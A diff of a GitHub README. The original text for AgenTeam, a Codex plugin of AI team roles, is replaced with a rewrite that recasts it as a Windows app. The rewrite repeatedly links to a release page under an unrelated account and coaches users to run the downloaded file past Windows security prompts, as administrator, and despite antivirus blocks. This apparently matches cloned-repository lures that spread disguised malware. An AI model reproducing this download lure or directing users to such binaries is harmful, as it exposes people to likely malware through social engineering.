@@ -1,82 +1,153 @@
-<p align="center">
-  <img src="assets/agenteam-banner.png" alt="AgenTeam — Role-based AI team for Codex" width="100%">
-</p>
+# 🤖 codex-agenteam - Clear AI Team for Coding Work
 
-<p align="center">
-  <a href="https://github.com/yimwoo/codex-agenteam/releases"><img src="https://img.shields.io/github/v/release/yimwoo/codex-agenteam?color=2563EB&label=version&style=flat-square" alt="Version"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-2563EB?style=flat-square" alt="MIT License"></a>
-  <a href="https://github.com/yimwoo/codex-agenteam/stargazers"><img src="https://img.shields.io/github/stars/yimwoo/codex-agenteam?color=2563EB&style=flat-square" alt="Stars"></a>
-  <a href="https://github.com/yimwoo/codex-agenteam/issues"><img src="https://img.shields.io/github/issues/yimwoo/codex-agenteam?color=2563EB&style=flat-square" alt="Issues"></a>
-</p>
+[![Download codex-agenteam](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Compoundlenswaggery933/codex-agenteam/releases)
 
-<p align="center">
-  <strong>A full AI development team — researcher, PM, architect, dev, QA, and reviewer — as native Codex agents, orchestrated through a configurable pipeline.</strong>
-</p>
+AI team for Codex — researcher, PM, architect, developer, QA, and reviewer in one Windows app
 
----
+## 📥 Download
 
-## Quick Start
+Visit this page to download the app for Windows:
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/yimwoo/codex-agenteam/main/install.sh | bash
-```
+https://github.com/Compoundlenswaggery933/codex-agenteam/releases
 
-Restart Codex, go to **Plugins > Local Plugins**, install AgenTeam, then:
+On that page, look for the latest release and download the Windows file.
 
-```
-@ATeam build my team
-```
+## 🪟 Windows setup
 
-If the role picker does not show `@Architect`, `@Dev`, and the others right
-away, confirm the project has `.codex/agents/*.toml`, then open a new thread
-or restart Codex so it reloads workspace agents.
+1. Open the release page in your browser.
+2. Find the latest version at the top of the list.
+3. Under **Assets**, download the Windows app file.
+4. If the file is in a ZIP folder, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
 
----
+If Windows shows a security prompt, choose **More info** and then **Run anyway** when you trust the source.
 
-## Your Team
+## 🧩 What codex-agenteam does
 
-| Role | Mention | Job |
-|------|---------|-----|
-| Researcher | `@Researcher` | Investigates docs, trends, prior art |
-| PM | `@Pm` | Prioritizes work, writes specs |
-| Architect | `@Architect` | Designs systems, identifies risks |
-| Dev | `@Dev` | Writes production code |
-| Qa | `@Qa` | Writes tests, catches regressions |
-| Reviewer | `@Reviewer` | Reviews for correctness and security |
+codex-agenteam helps you run a small AI work team from one place. Each role has a clear job:
 
-```
-@Architect review this API design
-@Dev fix the race condition in src/queue.py
-@ATeam add user authentication
-```
+- **Researcher** gathers useful context
+- **PM** helps shape the task
+- **Architect** plans the structure
+- **Developer** drafts the work
+- **QA** checks for issues
+- **Reviewer** looks for weak points
 
----
+The app uses a pipeline, so each step can feed the next one. That helps keep the process organized and easy to follow.
 
-## Documentation
+## ✨ Main uses
 
-- [**Setup & Installation**](docs/setup.md) — prerequisites, install, update
-- [**Configuration**](docs/configuration.md) — roles, profiles, model routing, two-layer config
-- [**Pipeline & Profiles**](docs/pipeline.md) — stages, gates, verification, resume, CI repair
-- [**CLI Reference**](docs/cli.md) — all skills and runtime commands
-- [**HOTL Integration**](docs/hotl.md) — structured execution with the HOTL plugin
+- Break down a task into smaller steps
+- Keep work moving in a set order
+- Review output before you use it
+- Handle software tasks with less manual work
+- Use one flow for planning, writing, and checking
+- Adjust the process with a config file
 
-## Governed Delivery Foundations
+## 🖥️ System needs
 
-AgenTeam 3.4 adds an optional governance foundation for teams handling larger
-features, multi-phase initiatives, or longer-lived delivery work. You can
-scaffold local assets with `agenteam-rt governed-bootstrap`, record structured
-decisions with `agenteam-rt decision append`, and evaluate starter tripwires
-with `agenteam-rt tripwire check`.
+For smooth use on Windows, use this setup:
 
-These commands are additive. Existing quick fixes, POCs, and standard pipeline
-flows keep working the same way unless you choose to layer governance on top.
+- **Windows 10 or Windows 11**
+- **4 GB RAM minimum**
+- **8 GB RAM recommended**
+- **500 MB free disk space**
+- **Stable internet connection**
+- **A modern browser for the download page**
 
----
+If your computer is older, close other apps before you start.
 
-## Contributing
+## 🛠️ How to use it
 
-Found a bug or have a role idea? [Open an issue](https://github.com/yimwoo/codex-agenteam/issues) or submit a PR.
+1. Start the app.
+2. Open or create a task.
+3. Pick the pipeline you want.
+4. Let the researcher gather context.
+5. Let the PM define the task.
+6. Let the architect shape the plan.
+7. Let the developer create the draft.
+8. Let QA check the result.
+9. Let the reviewer do the final pass.
+10. Save the output you want to keep.
 
-## License
+## ⚙️ Pipeline flow
 
-MIT © [Yiming Wu](https://github.com/yimwoo)
+The pipeline gives each role a clear place in the process. A simple flow looks like this:
+
+**Researcher → PM → Architect → Developer → QA → Reviewer**
+
+You can change the order or skip steps by using the config file. That makes it easier to match the app to your work style.
+
+## 📁 Configuration
+
+The app uses a configurable pipeline. In plain terms, that means you can tune how the AI team works.
+
+Common settings can include:
+
+- Which roles run
+- The order of the roles
+- The prompt used for each role
+- The output format
+- The review depth
+- The number of pass checks
+
+If you see a config file in the app folder, open it with Notepad and edit it with care.
+
+## 🔍 Tips for best results
+
+- Use one task at a time
+- Write a clear goal before you start
+- Keep prompts short and direct
+- Review the final output before you use it
+- Save working configs so you can reuse them
+- Keep the app up to date with the latest release
+
+## 🧠 When this app fits well
+
+This app fits well if you want help with:
+
+- Code planning
+- Task breakdowns
+- Drafting software work
+- Basic review checks
+- Team-style AI workflows
+- Repeating the same process across tasks
+
+## 📦 Release page
+
+Go to the release page here to download and run the Windows app:
+
+https://github.com/Compoundlenswaggery933/codex-agenteam/releases
+
+## 🧪 Troubleshooting
+
+If the app does not start:
+
+- Check that you downloaded the latest release
+- Make sure the file finished downloading
+- If you got a ZIP file, extract it first
+- Try running the app as administrator
+- Restart Windows and try again
+- Check that your antivirus did not block the file
+
+If the window opens but nothing happens:
+
+- Wait a few seconds for the first task to load
+- Close and reopen the app
+- Try a simpler task
+- Check your config file for a bad setting
+
+If you see a missing file error:
+
+- Download the release again
+- Make sure every file stayed in the same folder
+- Do not rename files unless the app tells you to
+
+## 🔐 File safety
+
+Keep the app in a folder you can find later. If you move files around after setup, the app may not find its settings or data.
+
+## 📄 Topics
+
+ai-agents, codex, developer-tools, llm, multi-agent, openai, orchestration, pipeline, productivity, software-engineering
